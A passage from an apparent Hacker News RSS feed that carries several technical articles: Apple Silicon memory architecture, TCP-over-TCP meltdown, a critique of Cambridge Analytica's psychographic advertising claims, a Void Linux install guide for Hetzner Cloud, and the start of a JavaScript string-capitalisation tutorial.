November 13, 2020 | https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/ | <a href="https://web.archive.org/web/*/https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>The new <a href="https://www.macworld.co.uk/news/how-good-is-apples-m1-chip-really-3797893/">M1 chip in the new Macs</a> has 8-16GB of DRAM on the package, just like many mobile phones or single-board computers. But unlike many desktop, laptop or workstation computers (there are exceptions). In the first tranche of Macs using the chip, that’s all the addressable RAM they have (i.e. ignoring caches), just like many mobile phones or single-board computers. But what happens when they move the Apple Silicon chips up the scale, to computers like the iMac or Mac Pro?</p>
<p>It’s possible that these models would have a few GB of memory on-package <em>and</em> access to memory modules connected via a conventional controller, for example DDR4 RAM. They almost certainly would if you could deploy <em>multiple</em> M1 (or successor) packages on a single system. Such a Mac would be a non-uniform memory access architecture (NUMA), which (depending on how it’s configured) has implications for how software can be designed to best make use of the memory.</p>
<p>NUMA computing is of course not new. If you have a computer with a CPU and a discrete graphics processor, you have a NUMA computer: the GPU has access to RAM that the CPU doesn’t, and vice versa. Running GPU code involves copying data from CPU-memory to GPU-memory, doing GPU stuff, then copying the result from GPU-memory to CPU-memory.</p>
<p>A hypothetical NUMA-because-Apple-Silicon Mac would not be like that. The GPU shares access to the integrated RAM with the CPU, a little like an Amiga. The situation on Amiga was that there was “chip RAM” (which both the CPU and graphics and other peripheral chips could access), and “fast RAM” (only available to the CPU). The fast RAM was faster because the CPU didn’t have to wait for the coprocessors to use it, whereas they had to take turns accessing the chip RAM. Nonetheless, the CPU had access to all the RAM, and programmers had to tell `AllocMem` whether they wanted to use chip RAM, fast RAM, or didn’t care.</p>
<p>A NUMA Mac would not be like that, either. It would share the property that there’s a subset of the RAM available for sharing with the GPU, but this memory would be faster than the off-chip memory because of the closer integration and lack of (relatively) long communication bus. Apple has described the integrated RAM as “high bandwidth”, which probably means multiple access channels.</p>
<p>A better and more recently analogy to this setup is Intel’s discontinued supercomputer chip, <a href="https://www.anandtech.com/show/8217/intels-knights-landing-coprocessor-detailed">Knight’s Landing</a> (marketed as Xeon Phi). Like the M1, this chip has 16GB of on-die high bandwidth memory. Like my hypothetical Mac Pro, it can also access external memory modules. Unlike the M1, it has 64 or 72 identical cores rather than 4 big and 4 little cores.</p>
<p>There are three ways to configure a Xeon Phi computer. You can not use any external memory, and the CPU entirely uses its on-package RAM. You can use a cache mode, where the software only “sees” the external memory and the high-bandwidth RAM is used as a cache. Or you can go full NUMA, where programmers have to explicitly request memory in the high-bandwidth region to access it, like with the Amiga allocator.</p>
<p>People rarely go full NUMA. It’s hard to work out what split of allocations between the high-bandwidth and regular RAM yields best performance, so people tend to just run with cached mode and hope that’s faster than not having any on-package memory at all.</p>
<p>And that makes me think that a Mac would either not go full NUMA, or would not have public API for it. <em>Maybe</em> Apple would let the kernel and some OS processes have exclusive access to the on-package RAM, but even that seems overly complex (particularly where you have more than one M1 in a computer, so you need to specify core affinity for your memory allocations in addition to memory type). My guess is that an early workstation Mac with 16GB of M1 RAM and 64GB of DDR4 RAM would look like it has 64GB of RAM, with the on-package memory used for the GPU and as cache. NUMA APIs, if they come at all, would come later.</p>
	</div></div>]]>
            </description>
            <link>https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080913</guid>
            <pubDate>Fri, 13 Nov 2020 10:26:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why TCP over TCP is a bad idea (2001)]]>
            </title>
            <description>
<![CDATA[
Score 108 | Comments 62 (<a href="https://news.ycombinator.com/item?id=25080693">thread link</a>) | @fanf2
<br/>
November 13, 2020 | http://sites.inka.de/~bigred/devel/tcp-tcp.html | <a href="https://web.archive.org/web/*/http://sites.inka.de/~bigred/devel/tcp-tcp.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <p>
      A frequently occurring idea for IP tunneling applications is to
      run a protocol like PPP, which encapsulates IP packets in a
      format suited for a stream transport (like a modem line), over a
      TCP-based connection. This would be an easy solution for
      encrypting tunnels by running <em>PPP over SSH</em>, for which
      several recommendations already exist (one in the Linux HOWTO
      base, one on my own website, and surely several others). It
      would also be an easy way to compress arbitrary IP traffic,
      while datagram based compression has hard to overcome efficiency
      limits.
    </p><p>
      Unfortunately, it doesn't work well. Long delays and frequent
      connection aborts are to be expected. Here is why.

    </p><h2>TCP's retransmission algorithm</h2>
    <p>
      TCP divides the data stream into <em>segments</em> which are
      sent as individual IP datagrams. The segments carry a
      <em>sequence number</em> which numbers the bytes in the stream,
      and an <em>acknowledge number</em> which tells the other side
      the last received sequence number. [RFC793]
    </p><p>
      Since IP datagrams may be lost, duplicated or reordered, the
      sequence numbers are used to reassemble the stream. The
      acknowledge number tells the sender, indirectly, if a segment
      was lost: when an acknowledge for a recently sent segment does
      not arrive in a certain amount of time, the sender assumes a
      lost packet and re-sends that segment.
    </p><p>
      Many other protocols using a similar approach, designed mostly
      for use over lines with relatively fixed bandwidth, have the
      "certain amount of time" fixed or configurable. In the Internet
      however, parameters like bandwidth, delay and loss rate are
      vastly different from one connection to another and even
      changing over time on a single connection. A fixed timeout in
      the seconds range would be inappropriate on a fast LAN and
      likewise inappropriate on a congested international link. In
      fact, it would increase the congestion and lead to an effect
      known as "meltdown".
    </p><p>
      For this reason, TCP uses adaptive timeouts for all
      timing-related parameters. They start at conservative estimates
      and change dynamically with every received segment. The actual
      algorithms used are described in [RFC2001]. The details are not
      important here but one critical property: <em>when a segment
      timeouts, the following timeout is increased</em>
      (exponentially, in fact, because that has been shown to avoid
      the meltdown effect).

    </p><h2>Stacking TCPs</h2>
    <p>
      The TCP timeout policy works fine in the Internet over a vast
      range of different connection characteristics. Because TCP tries
      very hard not to break connections, the timeout can increase up
      to the range of several minutes. This is just what is sensible
      for unattended bulk data transfer. (For interactive
      applications, such slow connections are of course undesirable
      and likely the user will terminate them.)
    </p><p>
      This optimization for reliability breaks when stacking one TCP
      connection on top of another, which was never anticipated by the
      TCP designers. But it happens when running PPP over SSH or
      another TCP-based protocol, because the PPP-encapsulated
      IP datagrams likely carry TCP-based payload, like this:
    </p><p>
      <img src="http://sites.inka.de/~bigred/devel/tcp-tcp.png" width="371" height="270" alt="(TCP over IP over PPP over SSH over TCP over IP)">
    </p><p>
      Note that the upper and the lower layer TCP have different
      timers. When an upper layer connection starts fast, its timers
      are fast too. Now it can happen that the lower connection has
      slower timers, perhaps as a leftover from a period with a
      slow or unreliable base connection.
    </p><p>
      Imagine what happens when, in this situation, the base
      connection starts losing packets. The lower layer TCP queues up
      a retransmission and increases its timeouts. Since the
      connection is blocked for this amount of time, the upper layer
      (i.e. payload) TCP won't get a timely ACK, and will also queue a
      retransmission. Because the timeout is still less than the lower
      layer timeout, <em>the upper layer will queue up more
      retransmissions faster than the lower layer can process
      them</em>. This makes the upper layer connection stall very
      quickly and every retransmission just adds to the problem - an
      internal meltdown effect.
    </p><p>
      TCPs reliability provisions backfire here. The upper layer
      retransmissions are completely unnecessary, since the carrier
      guarantees delivery - but the upper layer TCP can't know this,
      because TCP always assumes an unreliable carrier.

    </p><h2>Practical experience</h2>
    <p>
      The whole problem was the original incentive to start the <a href="http://sites.inka.de/~bigred/devel/cipe.html">CIPE</a>
      project, because I used a PPP over SSH solution for some time
      and it proved to be fairly unusable. At that time it had to run
      over an optical link which suffered frequent packet loss,
      sometimes 10-20% over an extended period of time. With plain
      TCP, this was just bearable (because the link was not
      congested), but with the stacked protocols, connections would
      get really slow and then break very frequently.

    </p><p>
      This is the detailed reason why CIPE uses a datagram carrier.
      (The choice for UDP, instead of another IP-level protocol like
      IPsec does, is for several reasons: this allows to distinguish
      tunnels by their port number, and it adds the ability to run
      over SOCKS.) The datagram carrier has exactly the same
      characteristics as plain IP, for which TCP was designed to run
      over.

    </p><hr>
    <address><a href="mailto:olaf@bigred.inka.de">Olaf Titz</a></address>
<!-- Created: Sun Oct 10 20:56:27 CEST 1999 -->
<!-- hhmts start -->
Last modified: Mon Apr 23 11:50:59 CEST 2001
<!-- hhmts end -->
  

</div>]]>
            </description>
            <link>http://sites.inka.de/~bigred/devel/tcp-tcp.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080693</guid>
            <pubDate>Fri, 13 Nov 2020 09:43:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thoughts on the Cambridge Analytica Scandal]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25080591">thread link</a>) | @sobradob
<br/>
November 13, 2020 | http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/ | <a href="https://web.archive.org/web/*/http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    
    <p><span>Nov 7, 2020 · 6 minute read
    
    <br>
    <a href="http://boazsobrado.com/categories/facebook">Facebook</a><a href="http://boazsobrado.com/categories/advertising">Advertising</a><a href="http://boazsobrado.com/categories/trump">Trump</a><a href="http://boazsobrado.com/categories/cambridge-analytica">Cambridge Analytica</a>
    </span></p><p>I am writing this to share my conclusions regarding the Cambridge Analytica affair. I have a somewhat unique perspective on the topic for three reasons:</p>

<ul>
<li>My day job consists of measuring the effectiveness of digital advertising.</li>
<li>I have first hand experience with the technology and methods that Cambridge Analytica claims to have used.</li>
<li>I played a small role in unearthing the Cambridge Analytica scandal.</li>
</ul>

<h2 id="what-cambridge-analytica-supposedly-did">What Cambridge Analytica supposedly did</h2>

<p>The New Statesmen’s Laurie Clarke puts it in the <a href="https://www.newstatesman.com/science-tech/social-media/2020/10/how-cambridge-analytica-scandal-unravelled">following way</a>:</p>

<blockquote>
<p>CA was alleged to have mined Facebook data from millions of people worldwide. The data was detailed enough for CA to create complex psychographic profiles of its subjects, to deliver pinpointed adverts to them and propel them into new behaviour patterns. The CA whistleblower Christopher Wylie described it as “Steve Bannon’s psychological warfare mind-fuck tool”. </p>
</blockquote>

<p>In the Netflix documentary <em>The Great Hack</em> Brittany Kaiser, the former business development executive of Cambridge Analytica says:</p>

<blockquote>
<p>“If we targeted enough persuadable people in the right precincts, then those states would turn red instead of blue… We bombarded them through blogs, websites, articles, videos on every platform you can imagine until they saw the world the way we wanted them to – until they voted for our candidate.”</p>
</blockquote>

<p>The implication here being that two of the greates political upsets of the last decade (Brexit &amp; Trump) were due to the advanced persuasion technology that Cambridge Analytica sold to the highest bidder.</p>

<p>My concern is that a lot of people seem to focus on a scary technology called psychographic advertising (also known as psychographic or&nbsp;<a href="https://hbr.org/2018/05/what-marketers-should-know-about-personality-based-marketing">personality marketing</a>) that purportedly allowed Cambridge Analytica to manipulate people by serving them ads tailored to their individual personality. My argument is that this technology is mostly ineffective in the context of modern digital advertising and is unlikely to have had the influence attributed to it. Moreover, it distracts from the true issues at stake, such as data privacy in the days of “<a href="https://www.theguardian.com/technology/2019/jan/20/shoshana-zuboff-age-of-surveillance-capitalism-google-facebook">surveillance capitalism</a>”.</p>

<h2 id="my-role-in-the-story">My role in the story</h2>

<p>Between 2012 and 2014 I did some work at the Cambridge University Psychometric Centre in as an undergraduate, and I met in person Alex Kogan and a lot of the people who were mentioned in the&nbsp;<a href="https://www.michalkosinski.com/clown-show">books</a>&nbsp;and&nbsp;<a href="https://www.nytimes.com/2018/03/17/us/politics/cambridge-analytica-trump-campaign.html">articles</a>&nbsp;that have been written about the whole scandal. While at Cambridge I had access to key parts of the data set that inspired Cambridge Analytica’s work.</p>

<p>In 2015 I spent some time at Stanford, where I recruited several well-known brands (who I presume would rather not be named) to test psychographic marketing in a commercial setting. While doing my research on psychographic marketing, I discovered that a little known company called Cambridge Analytica was working with Ted Cruz on psychometric targeting in digital advertising.</p>

<p>I pointed this out to&nbsp;<a href="https://www.michalkosinski.com/">Dr Michal Kosinski</a>, who was familiar with the unethical way in which the Cambridge Analytica had collected its data. Michal then got in touch with a journalist at the Guardian, who produced the&nbsp;<a href="https://www.theguardian.com/us-news/2015/dec/11/senator-ted-cruz-president-campaign-facebook-user-data">first article</a>&nbsp;in what later became known as the Cambridge Analytica scandal in December 2015.</p>

<p>Eventually I failed to get psychographic advertising to work for commercial purposes in 2015 and moved on to other projects. Since then, I’ve also spoken to other teams that spent years trying to get a commercially viable personality marketing to work, who also failed. As far as I know, Facebook also ran some tests internally and decided not to proceed with it in early 2015. From this I drew the conclusion was that psychographic marketing doesn’t&nbsp;<strong>really</strong>&nbsp;work, particularly not in the way Cambridge Analytica claimed it did. Let me illustrate why by looking at one of the key scientific papers on personality marketing.</p>

<h2 id="what-the-science-says">What the science says</h2>

<p>This&nbsp;<a href="https://www.pnas.org/content/114/48/12714/">paper</a>&nbsp;was written by Sandra Matz and friends. The experiments they describe are clever: studies 1 and 2 show that you can target high individuals who score highly along a certain personality dimension (say, are extroverted), and that these individuals respond better to messages crafted for their end of the dimension than the opposite dimension (e.g. highly extroverted people respond better to high extroversion crafted messages than low extroversion messages). In study 3, they show that a psychologically targeted message towards introverts performed better than the copy used by a company previously.</p>

<p>This study is important in that it demonstrates three things:</p>

<ul>
<li>It is possible to target people online based on their personality</li>
<li>It is possible to tailor messages to people online based on their personality, and these messages perform better than those tailored for people with an opposite personality.</li>
</ul>

<p>What Sandra’s paper does not show, is that psychographic advertising performs better than standard methods used in digital advertising. In my experience it does not, and I can explain why.</p>

<p>Personality based advertising is based on a simple five dimensional model of human beings, designed to explain behaviours as diverse as reading books and going to clubs. Facebooks machine learning algorithms create a high dimensional model finely tuned with thousands of data points trying to optimise for very specific outcomes, such as purchasing a MAGA hat. The former is a general descriptive model built using statistical methods of the mid 20th century, with some but overall limited predictive general validity. The latter is a highly specialised machine learning model, with little descriptive power, but lot more accurate at predicting specific behaviours like the purchases of haircuts.</p>

<h2 id="digital-advertising-in-practice">Digital advertising in practice</h2>

<p>Keeping that in mind, which of these two digital approaches do you think will yield better results?</p>

<ul>
<li>Approach A: Summon the best psychologists and copywriters in the world to write copy that will get extroverted people to purchase a brand of deodorant. Target highly extroverted people on Facebook with that copy by advertising to people who have “liked” highly extroverted pages.</li>
<li>Approach B: Using Facebook’s machine learning algorithms generate a Lookalike audience based on previous purchasers on your site. Target these people with thousands of different types of programmatically generated messages, and focus on the better performing ones.</li>
</ul>

<p>When I researched this in 2015 I found that Approach B will perform better at all times. In fact, Approach B is more like what Trump&nbsp;<a href="https://www.theatlantic.com/technology/archive/2020/04/how-facebooks-ad-technology-helps-trump-win/606403/">actually did in 2016</a>:</p>

<p><em>“During the 2016 election cycle, Trump’s team ran 5.9 million ads on Facebook, spending $44 million from June to November alone. Hillary Clinton’s campaign ran only 66,000.”</em></p>

<p>Instead of trying a fancy secret sauce on how to design creatives and how to target them Trump’s team just threw everything at the algorithm and stuck with the ads that performed the best. All the psychological theory in the world has limited efficiency compared to the AI powering Facebook’s ad optimisations.</p>

<h2 id="so-what-do-i-think">So what do I think?</h2>

<p>In conclusion, it is not that psychographic advertising doesn’t work at all. The science behind it is solid, and it is worthy of study. My point is that psychographic advertising afforded Cambridge Analytica little to no advantage at all. Cambridge Analytica was working with more or less the same technology as their competitors. Most of the outlandish claims made by Cambridge Analytica were just branding, and subsequently sensationalism by reporting journalists. These are not just my conclusions by the way, they are also the findings of the&nbsp;<a href="https://ico.org.uk/media/action-weve-taken/2618383/20201002_ico-o-ed-l-rtl-0181_to-julian-knight-mp.pdf">British Information Commissioner’s Office</a>&nbsp;(excellent summary&nbsp;<a href="https://twitter.com/nickconfessore/status/1313853996168351747">here</a>). The “secret sauce” part of this affair should not distract from the wide scale data harvesting of large tech monopolies and the data privacy issues that arise from it.</p>

  </div>
  
</div></div>]]>
            </description>
            <link>http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080591</guid>
            <pubDate>Fri, 13 Nov 2020 09:22:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Installing Void Linux on a Hetzner Cloud VPS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080543">thread link</a>) | @0x0f0f0f
<br/>
November 13, 2020 | https://0x0f0f0f.github.io/posts/2020/11/supercharge-your-cloud-1-installing-void-linux-on-hetzner-vpss/ | <a href="https://web.archive.org/web/*/https://0x0f0f0f.github.io/posts/2020/11/supercharge-your-cloud-1-installing-void-linux-on-hetzner-vpss/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>Systemd sucks <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, <sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, <sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>, <sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>, <sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> but <a href="https://cloud.hetzner.com/">Hetzner Cloud</a> rocks, and is one of my favourite VPS providers.
Hetzner has been providing Debian, Arch Linux, Ubuntu and CentOS images for cloud VPS instances, but wait!
They all use systemd! I have been using Void Linux for years now on mostly all of my devices. I have even
built a PDA that runs Void Linux <sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup>.</p>
<p>Those days,  I was building a personal cloud instance with a few servers (more details in the following write-up posts),
and I ran into some very annoying issues that were directly caused by the unnecessary complexity of systemd. Docker was definitely resource overkill for this task.</p>
<p>Let’s jump straight to the guide on how to install Void Linux on a Hetzner Cloud VPS instance.</p>
<h2 id="rescue-mode">Rescue Mode</h2>
<p>The first step is to create a server on your Hetzner Cloud account. Choose Ubuntu as the initial OS image choice.
Do not add any volume or SSH key in the initial configuration wizard, as those will have to be manually managed after installing Void.
Do not upload anything on the server. The root partition will be formatted and wiped out!</p>
<p>After installing, turn off the server and boot in rescue mode.</p>
<p><img src="https://0x0f0f0f.github.io/posts/images/hetzner1.png" alt="/posts/images/hetzner1.png"></p>
<p>You will be provided with an username (<code>root</code>) and a password for the rescue system. Copy this password somewhere!</p>
<p>Now is time to login into the rescue system by SSH-ing into the server, as you would normally do with the IPv4 address that Hetzner shows at the top of the server page:</p>
<div><pre><code data-lang="sh">ssh root@your-server-ipv4-address
</code></pre></div><h2 id="unpacking-the-tarball">Unpacking the tarball</h2>
<p>Login with the password Hetzner has just provided you, and run the <code>installimage</code> script. The following menu will be shown, choose
custom_image.</p>
<p><img src="https://0x0f0f0f.github.io/posts/images/hetzner2.png" alt="/posts/images/hetzner2.png"></p>
<p><code>installimage</code> will then open an editor with a configuration file.
Scroll down to the line containing <code>HOSTNAME</code> and change the value to the machine hostname you are going to set later.</p>
<p>Time to choose what image to install on the server! We will need a ROOTFS tarball of the system. I have not tested the <code>musl</code> version
and therefore I cannot recommend to use it. The standard <code>glibc</code> version works very fine for me.</p>
<p>Go on the Void Linux downloads repository <sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup>, scroll down at the very end and <strong>copy the link</strong>
of the x86_64 ROOTFS tarball. The file name will be something like this¸
but the build date will obviously become different in the future.</p>
<pre><code>void-x86_64-ROOTFS-20191109.tar.xz
</code></pre><p>Be sure that the URL you have been copied looks like this:</p>
<pre><code>https://alpha.de.repo.voidlinux.org/live/current/void-x86_64-ROOTFS-20191109.tar.xz
</code></pre><p>Now, go back to your rescue system SSH session, where we left it at the <code>installimage</code> config editor,
scroll down at the end of the config file, at the line starting with <code>IMAGE</code>, and paste
the Void Linux ROOTFS tarball URL after the word <code>IMAGE</code>, on the same line, like this:</p>
<pre><code>IMAGE https://alpha.de.repo.voidlinux.org/live/current/void-x86_64-ROOTFS-20191109.tar.xz
</code></pre><p>You could change other settings in the config file, such as the disks partitioning,
but for simplicity I have been sticking with the default, single root ext4 partition.</p>
<p>Press F2 to save and then press F10 to exit. Hetzner’s <code>installimage</code> script will format
the <code>/dev/sda</code> and unpack the Void tarball automatically. It will probably fail at the end, but
don’t worry!</p>
<h2 id="chroot-time">Chroot time!</h2>
<p>Now, the installer will probably exit with an error.
We should be fine if it has unpacked the tarball correctly in the <code>/dev/sda1</code> partition.
Now check if there is an ext4 partition in there, run:</p>
<p>Now, mount it to <code>/mnt</code>.</p>
<p>Check if <code>/mnt/</code> contains the Void ROOTFS tarball contents.</p>
<p>The rest of the guide is pretty much the guide for installing Void from chroot <sup id="fnref:8"><a href="#fn:8" role="doc-noteref">8</a></sup>, but is not identical!
Some steps are different (or not needed).
Though, I will still report the rest of the steps you need for setting up your Void VPS on Hetzner.</p>
<p>Mount the pseudo-filesystems needed for a chroot:</p>
<div><pre><code data-lang="sh"><span>for</span> i in sys dev proc; <span>do</span> mount --rbind /$i /mnt/$i <span>&amp;&amp;</span> mount --make-rslave /mnt/$i; <span>done</span>
</code></pre></div><p>Copy the DNS configuration into the new root so that XBPS can still download new packages inside the chroot:</p>
<div><pre><code data-lang="sh">cp /etc/resolv.conf /mnt/etc/
</code></pre></div><p>Chroot into the new installation:</p>
<div><pre><code data-lang="sh">PS1<span>=</span><span>'(chroot) # '</span> chroot /mnt/ /bin/bash
</code></pre></div><p>Congrats! You’re in the chroot.</p>
<h2 id="finishing-the-installation">Finishing the installation</h2>
<p>Check the internet connection:</p>
<p>ROOTFS images generally contain out of date software, due to being a snapshot of the time when they were built, and do not come with a complete <code>base-system</code>. Update the package manager and install <code>base-system</code>:</p>
<div><pre><code data-lang="sh">xbps-install -Su xbps
xbps-install -u
xbps-install base-system
xbps-remove base-voidstrap
</code></pre></div><p>Specify the hostname in <code>/etc/hostname</code>. Use the same one you used in the previous step when editing Hetzner <code>installimage</code>’s config:</p>
<div><pre><code data-lang="sh">echo <span>'yourhostname'</span> &gt; /etc/hostname
</code></pre></div><p>For glibc builds, generate locale files with:</p>
<div><pre><code data-lang="sh">xbps-reconfigure -f glibc-locales
</code></pre></div><p>Install your favourite text editor. I’m ok with nano.</p>
<p>Now edit <code>/etc/fstab</code>. This is very simple <code>fstab</code> is OK. See the references <sup id="fnref:9"><a href="#fn:9" role="doc-noteref">9</a></sup> for more.</p>
<pre><code>proc /proc proc defaults 0 0
/dev/sda1 / ext4 defaults,discard 0 0
</code></pre><p>Install GRUB. Hetzner uses DOS disk partitioning.</p>
<pre><code>xbps-install grub
grub-install /dev/sda
</code></pre><p>Use xbps-reconfigure(1) to ensure all installed packages are configured properly:</p>
<p>Congrats! You have now installed Void on Hetzner Cloud.
You will need a couple of config tweaks before rebooting into a working install.
Don’t exit from the <code>chroot</code> shell yet!</p>
<h2 id="final-tweaks">Final tweaks</h2>
<p>While still in the chroot, enable the <code>dhcpcd</code> service:</p>
<div><pre><code data-lang="sh">ln -s /etc/sv/dhcpcd /var/service/
</code></pre></div><p>Enable the <code>sshd</code> service for remote login through SSH.
I suggest you also install <code>ssh-audit</code>, and check out
the awesome SSH HARDENING GUIDES <sup id="fnref:10"><a href="#fn:10" role="doc-noteref">10</a></sup> to ensure that
your Void VPS is safe and sound from unwanted remote logins.</p>
<div><pre><code data-lang="sh">ln -s /etc/sv/sshd /var/service/
</code></pre></div><p>Copy your SSH public key to your local PC clipboard and save it in the VPS root account <code>authorized_keys</code> file,
to later authorize your remote SSH login sessions.</p>
<div><pre><code data-lang="sh">mkdir /root/.ssh
nano /root/.ssh/authorized_keys
<span># paste your PUBLIC key in there and save</span>
</code></pre></div><p>Change the root password</p>
<p>Add an additional user</p>
<div><pre><code data-lang="sh">useradd --shell /bin/bash voiduser
</code></pre></div><p>Change its password</p>
<p>That’s all! Have fun with your Void Linux VPS!</p>
<p>Now run <code>reboot</code> and login with SSH, as usual, into your fresh new Void Linux VPS!</p>
<h2 id="additional-goodies">Additional Goodies</h2>
<p>Uncomplicated Firewall. Don’t enable before allowing the SSH port (change it from 22 to the port you are
using if you changed it in your <code>sshd_config</code>) <sup id="fnref:11"><a href="#fn:11" role="doc-noteref">11</a></sup></p>
<div><pre><code data-lang="sh">xbps-install -S ufw
ln -s /etc/sv/ufw /var/service/ufw
ufw allow <span>22</span> <span># CHANGE THE PORT TO YOUR SSHD PORT IF IT IS NOT 22!</span>
<span># add all the rules you like :)</span>
ufw enable
</code></pre></div><p>dtach and dvtm <sup id="fnref:12"><a href="#fn:12" role="doc-noteref">12</a></sup></p>
<div><pre><code data-lang="sh">xbps-install -S dtach
dtach -A ~/dvtm-session -r winch dvtm
</code></pre></div><hr>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p><a href="https://suckless.org/sucks/systemd/">https://suckless.org/sucks/systemd/</a> <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://nosystemd.org/">https://nosystemd.org/</a> <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>#systemdsucks on freenode! <a href="#fnref:3" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p><a href="http://galexander.org/systemd_sucks.html">http://galexander.org/systemd_sucks.html</a> <a href="#fnref:4" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:5" role="doc-endnote">
<p><a href="https://news.ycombinator.com/item?id=12589281">https://news.ycombinator.com/item?id=12589281</a> <a href="#fnref:5" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:6" role="doc-endnote">
<p>Building a Raspberry Pi 3B+ full keyboard handheld. <a href="https://0x0f0f0f.github.io/posts/2019/08/building-a-raspberry-pi-3b-full-keyboard-handheld.-part-1/">Part 1</a> <a href="https://0x0f0f0f.github.io/posts/2019/09/building-a-raspberry-pi-3b-full-keyboard-handheld.-part-2/">Part 2</a> <a href="#fnref:6" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:7" role="doc-endnote">
<p><a href="https://alpha.de.repo.voidlinux.org/live/current/">https://alpha.de.repo.voidlinux.org/live/current/</a> <a href="#fnref:7" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:8" role="doc-endnote">
<p><a href="https://docs.voidlinux.org/installation/guides/chroot.html#entering-the-chroot">https://docs.voidlinux.org/installation/guides/chroot.html#entering-the-chroot</a> <a href="#fnref:8" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:9" role="doc-endnote">
<p><a href="https://docs.voidlinux.org/installation/guides/chroot.html#configure-fstab">https://docs.voidlinux.org/installation/guides/chroot.html#configure-fstab</a> <a href="#fnref:9" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:10" role="doc-endnote">
<p><a href="https://www.sshaudit.com/hardening_guides.html">https://www.sshaudit.com/hardening_guides.html</a> <a href="#fnref:10" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:11" role="doc-endnote">
<p><a href="https://launchpad.net/ufw">https://launchpad.net/ufw</a> <a href="#fnref:11" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:12" role="doc-endnote">
<p><a href="https://www.digitalocean.com/community/tutorials/how-to-use-dvtm-and-dtach-as-a-terminal-window-manager-on-an-ubuntu-vps">https://www.digitalocean.com/community/tutorials/how-to-use-dvtm-and-dtach-as-a-terminal-window-manager-on-an-ubuntu-vps</a> <a href="#fnref:12" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

            </div></div>]]>
            </description>
            <link>https://0x0f0f0f.github.io/posts/2020/11/supercharge-your-cloud-1-installing-void-linux-on-hetzner-vpss/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080543</guid>
            <pubDate>Fri, 13 Nov 2020 09:13:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Capitalize Strings in JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080514">thread link</a>) | @robinvdvleuten
<br/>
November 13, 2020 | https://robinvdvleuten.nl/blog/how-to-capitalize-strings-in-javascript/ | <a href="https://web.archive.org/web/*/https://robinvdvleuten.nl/blog/how-to-capitalize-strings-in-javascript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>To capitalize a string in Javascript so the first character is in uppercase, we don’t need to add another NPM dependency. We can use plain JavaScript or even CSS if it is solely for presentational purposes.</p><h2 id="tldr">TLDR;</h2><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>'hello'</span>
<span>chars</span><span>[</span><span>0</span><span>].</span><span>toUpperCase</span><span>()</span> <span>+</span> <span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span> <span>// 'Hello'
</span></code></pre></div><h2 id="walk-through-all-steps">Walk through all steps</h2><p>Let’s see how we can approach this through a couple of common JavaScript functions. First, you have to keep in mind that strings are characters. So another way to write a string, is to create an array of characters that we join together.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>[</span><span>'h'</span><span>,</span> <span>'e'</span><span>,</span> <span>'l'</span><span>,</span> <span>'l'</span><span>,</span> <span>'o'</span><span>].</span><span>join</span><span>(</span><span>''</span><span>)</span> <span>// 'hello'
</span></code></pre></div><h3 id="uppercase-the-first-letter">Uppercase the first letter</h3><p>You can access any character within this array through its index. So if we need the letter <code>e</code> from this array, we can use square brackets to access it at index <code>1</code> (as arrays always start counting their index at <code>0</code>).</p><p>But since the introduction of ECMAScript 5, we can treat strings as an array-like object. And thus access any character from a string in a similar fashion.</p><div><pre><code data-lang="js"><span>// We get the first letter by accessing the character at index zero.
